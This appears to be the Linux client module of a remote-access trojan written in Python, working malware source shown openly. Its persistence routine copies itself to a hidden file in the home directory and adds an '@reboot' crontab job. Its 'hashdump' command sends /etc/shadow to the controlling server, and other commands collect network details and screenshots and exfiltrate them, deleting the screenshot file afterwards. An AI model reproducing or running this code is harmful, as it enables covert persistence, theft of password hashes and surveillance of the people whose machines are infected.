import sys, os, subprocess
import secrets
import shutil, mss, mss.tools

from client import Client

SHADOW_PATH = "/etc/shadow"

class LinuxClient(Client):

    ####################################################################################################################
    ################################################# CONSTRUCTOR ######################################################
    ####################################################################################################################
    def __init__(self, server_address, server_port, server_beat_port, debug_mode):
        super().__init__(server_address, server_port, server_beat_port, debug_mode)
        self.debug_print("Linux Client Initialised")

    ####################################################################################################################
    ############################################## USUAL METHODS #######################################################
    ####################################################################################################################

    def persistence(self):
        self.debug_print("PERSISTENCE", True)
        self.agent_path = os.path.join(os.getenv('HOME'), f".{self.uid}")
        try:
            shutil.copy2(sys.argv[0], self.agent_path)
        except Exception as e:
            return 1

        # Read whole current crontab
        try:
            crontab = subprocess.run(['crontab', '-l'], capture_output=True, text=True).stdout
        except:
            return 0
        # Malicious cron for persistence
        job = f"@reboot bash -c {self.agent_path}\n"

        # Check if cron already exist
        if job not in crontab:
            crontab = crontab + job
            process = subprocess.run(['crontab', '-'], input=crontab, text=True)

    ####################################################################################################################
    ########################################### CLIENT COMMANDS ########################################################
    ####################################################################################################################

    def hashdump(self, args):
        self.debug_print("HASHDUMP", True)
        self.send_file(SHADOW_PATH)

    def ipconfig(self, args):
        self.debug_print("IPCONFIG", True)
        output = subprocess.check_output("ip a", shell=True, text=True, encoding='utf-8', stderr=subprocess.STDOUT)
        self.block_sending_data(output.encode())

    def screenshot(self, args):
        self.debug_print("SCREENSHOT", True)
        screen_path = os.path.join("/tmp", f"{secrets.token_hex(5)}.jpg")
        self.debug_print(f"Path {screen_path}")

        with mss.mss() as sct:
            screenshot = sct.grab(sct.monitors[0])
            mss.tools.to_png(screenshot.rgb, screenshot.size, output=screen_path)
            self.debug_print(f"screenshot saved at {screen_path}")

        self.send_file(screen_path)
        self.delete_file(screen_path)
